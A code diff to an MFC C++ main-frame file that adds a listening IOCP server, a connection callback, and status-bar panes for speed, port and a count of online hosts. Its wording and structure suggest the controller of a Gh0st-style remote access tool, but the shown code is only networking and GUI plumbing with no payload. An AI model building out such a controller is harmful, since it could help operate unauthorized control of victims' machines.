@@ -17,10 +17,16 @@
 
 #include "MainFrm.h"
 
+#include "PcView.h"
+#include "LogView.h"
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
+extern CPcView*     g_pConnectView; //在NotifyProc中初始化
+extern CLogView*	g_pLogView;
+CIOCPServer *m_iocpServer = NULL;
+CMainFrame	*g_pFrame; // 在CMainFrame::CMainFrame()中初始化
 // CMainFrame
 
 IMPLEMENT_DYNCREATE(CMainFrame, CFrameWndEx)
@@ -36,6 +42,7 @@ BEGIN_MESSAGE_MAP(CMainFrame, CFrameWndEx)
 	ON_COMMAND(ID_FILE_PRINT_DIRECT, &CMainFrame::OnFilePrint)
 	ON_COMMAND(ID_FILE_PRINT_PREVIEW, &CMainFrame::OnFilePrintPreview)
 	ON_UPDATE_COMMAND_UI(ID_FILE_PRINT_PREVIEW, &CMainFrame::OnUpdateFilePrintPreview)
+	ON_WM_CLOSE()
 END_MESSAGE_MAP()
 
 // CMainFrame 构造/析构
@@ -44,6 +51,7 @@ CMainFrame::CMainFrame()
 {
 	// TODO: 在此添加成员初始化代码
 	theApp.m_nAppLook = theApp.GetInt(_T("ApplicationLook"), ID_VIEW_APPLOOK_OFF_2007_AQUA);
+	g_pFrame = this;
 }
 
 CMainFrame::~CMainFrame()
@@ -65,15 +73,19 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 		TRACE0("未能创建状态栏\n");
 		return -1;      // 未能创建
 	}
-
 	CString strTitlePane1;
 	CString strTitlePane2;
+	CString strSpeed;
 	bNameValid = strTitlePane1.LoadString(IDS_STATUS_PANE1);
 	ASSERT(bNameValid);
 	bNameValid = strTitlePane2.LoadString(IDS_STATUS_PANE2);
 	ASSERT(bNameValid);
+	bNameValid = strSpeed.LoadString(ID_STAUTSSPEED);
+	ASSERT(bNameValid);
 	m_wndStatusBar.AddElement(new CMFCRibbonStatusBarPane(ID_STATUSBAR_PANE1, strTitlePane1, TRUE), strTitlePane1);
 	m_wndStatusBar.AddExtendedElement(new CMFCRibbonStatusBarPane(ID_STATUSBAR_PANE2, strTitlePane2, TRUE), strTitlePane2);
+	m_wndStatusBar.AddElement(new CMFCRibbonStatusBarPane(ID_STATUSBAR_PANE3, strSpeed, TRUE), strSpeed);
+	m_wndStatusBar.AddElement(new CMFCRibbonStatusBarPane(ID_STATUSBAR_PANE4, _T("--"), TRUE), _T("--"));
 
 	// 启用 Visual Studio 2005 样式停靠窗口行为
 	CDockingManager::SetDockingMode(DT_SMART);
@@ -220,6 +232,44 @@ void CMainFrame::Dump(CDumpContext& dc) const
 
 // CMainFrame 消息处理程序
 
+void CALLBACK CMainFrame::NotifyProc(LPVOID lpParam, ClientContext *pContext, UINT nCode)
+{
+	try
+	{
+		CMainFrame* pFrame = (CMainFrame*) lpParam;
+		CString str;
+		// 对g_pConnectView 进行初始化
+		g_pConnectView = (CPcView *)((CSquirrelApp *)AfxGetApp())->m_pConnectView;
+
+		// g_pConnectView还没创建，这情况不会发生
+		if (((CSquirrelApp *)AfxGetApp())->m_pConnectView == NULL)
+			return;
+
+		g_pConnectView->m_iocpServer = m_iocpServer;
+
+		//str.Format("S: %.2f kb/s R: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
+		str.Format(_T("发送: %.2f kb/s 接收: %.2f kb/s"), (float)m_iocpServer->m_nSendKbps / 1024, (float)m_iocpServer->m_nRecvKbps / 1024);
+		//g_pFrame->m_wndStatusBar.SetPaneText(1, str);
+		g_pFrame->m_wndStatusBar.GetElement(1)->SetText(str);
+		
+		switch (nCode)
+		{
+		case NC_CLIENT_CONNECT:
+			break;
+		case NC_CLIENT_DISCONNECT:
+			//g_pConnectView->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
+			break;
+		case NC_TRANSMIT:
+			break;
+		case NC_RECEIVE:
+			//ProcessReceive(pContext);
+			break;
+		case NC_RECEIVE_COMPLETE:
+			//ProcessReceiveComplete(pContext);
+			break;
+		}
+	}catch(...){}
+}
 void CMainFrame::OnApplicationLook(UINT id)
 {
 	CWaitCursor wait;
@@ -343,4 +393,71 @@ void CMainFrame::OnFilePrintPreview()
 void CMainFrame::OnUpdateFilePrintPreview(CCmdUI* pCmdUI)
 {
 	pCmdUI->SetCheck(IsPrintPreview());
+}
+
+void CMainFrame::Activate(UINT nPort, UINT nMaxConnections)
+{
+	CString		str;
+
+	if (m_iocpServer != NULL)
+	{
+		m_iocpServer->Shutdown();
+		delete m_iocpServer;
+
+	}
+	m_iocpServer = new CIOCPServer;
+
+	// 开启IPCP服务器
+	if (m_iocpServer->Initialize(NotifyProc, this, 100000, nPort))
+	{
+		char hostname[256];
+		gethostname(hostname, sizeof(hostname));
+		HOSTENT *host = gethostbyname(hostname);
+		if (host != NULL)
+		{
+			for (int i = 0; ; i++)
+			{
+				str += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
+				if (host->h_addr_list[i] + host->h_length >= host->h_name)
+					break;
+				str += "-";
+			}
+		}
+		CTime time = CTime::GetCurrentTime(); ///构造CTime对象 
+		CString strTime = time.Format("  [ 启动时间:%Y年%m月%d日 %H时%M分%S秒 ]");
+		CString strPort, strLogText;
+		//m_wndStatusBar.SetPaneText(0, strTime);
+		//CMFCRibbonStatusBarPane * pTxt1 = DYNAMIC_DOWNCAST(CMFCRibbonStatusBarPane, m_wndStatusBar.FindElement(ID_STATUSBAR_PANE1));
+		//pTxt1->SetText(strTime);
+		m_wndStatusBar.GetElement(0)->SetText(strTime);
+		
+		strPort.Format(L"监听端口: %d", nPort);
+		m_wndStatusBar.GetElement(2)->SetText(strPort);
+		strLogText.Format(L"系统成功启动 -> 监听端口: [ %d ]", nPort);
+		g_pLogView->InsertLogItem(strLogText, 0, 0);
+	}
+	else
+	{
+		str.Format(L"监听端口: [%d]绑定失败,可能你已开启另一个控制端或者端口被占用！", nPort);
+		//m_wndStatusBar.SetPaneText(0, str);
+		//m_wndStatusBar.SetPaneText(2, "监听端口: 0");
+		m_wndStatusBar.GetElement(0)->SetText(str);
+		m_wndStatusBar.GetElement(2)->SetText(L"监听端口: 0");
+		g_pLogView->InsertLogItem(str, 0, 1);
+		
+	}
+
+	//m_wndStatusBar.SetPaneText(3, "上线主机: 0");
+	m_wndStatusBar.GetExElement(0)->SetText(_T("上线主机: 0"));
+	//m_wndStatusBar.Invalidate();
+	m_wndStatusBar.RecalcLayout();
+}
+
+void CMainFrame::OnClose()
+{
+	// TODO: 在此添加消息处理程序代码和/或调用默认值
+	m_iocpServer->Shutdown();
+	delete m_iocpServer;
+
+	CFrameWndEx::OnClose();
 }
